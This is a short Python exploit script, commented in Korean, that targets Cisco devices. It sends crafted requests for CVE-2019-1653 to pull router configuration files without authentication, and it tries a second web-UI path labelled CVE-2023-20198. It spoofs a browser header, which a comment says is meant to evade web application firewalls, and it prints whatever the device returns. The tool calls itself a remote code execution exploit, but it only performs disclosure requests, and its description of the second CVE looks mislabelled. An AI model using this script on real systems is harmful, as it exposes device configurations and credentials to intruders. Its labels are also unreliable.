import requests
import argparse
import warnings
from urllib.parse import urlparse

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "*/*",
}

# CVE-2019-1653 Exploit (Cisco RV320/RV325 Configuration Disclosure)
def exploit_cve_2019_1653(target_url):
    try:
        payload = "/cgi-bin/config.exp"
        exploit_url = f"{target_url}{payload}"

        response = requests.get(exploit_url, headers=HEADERS, verify=False, timeout=10)
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text[:500])  # 첫 500자만 출력

        if response.status_code == 200:
            print("[SUCCESS] CVE-2019-1653 Exploit successful!")
            print("Server Response:")
            print(response.text)
        else:
            print("[FAIL] Exploit attempt failed. Check target and parameters.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# CVE-2023-20198 Exploit (Cisco Web UI Unauthorized Logout)
def exploit_cve_2023_20198(target_url):
    try:
        payload = "/webui/logoutconfirm.html?menu=1"
        exploit_url = f"{target_url}{payload}"

        response = requests.get(exploit_url, headers=HEADERS, verify=False, timeout=10)
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text[:500])  # 첫 500자만 출력

        if response.status_code == 200:
            print("[SUCCESS] CVE-2023-20198 Exploit successful!")
            print("Server Response:")
            print(response.text)
        else:
            print("[FAIL] Exploit attempt failed. Check target and parameters.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Cisco Remote Code Execution (RCE) Exploit Tool",
        usage="python3 exploit.py --url <URL>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    
    args = parser.parse_args()

    print("[INFO] Attempting exploitation...")
    exploit_cve_2019_1653(args.url)
    exploit_cve_2023_20198(args.url)

if __name__ == "__main__":
    main()
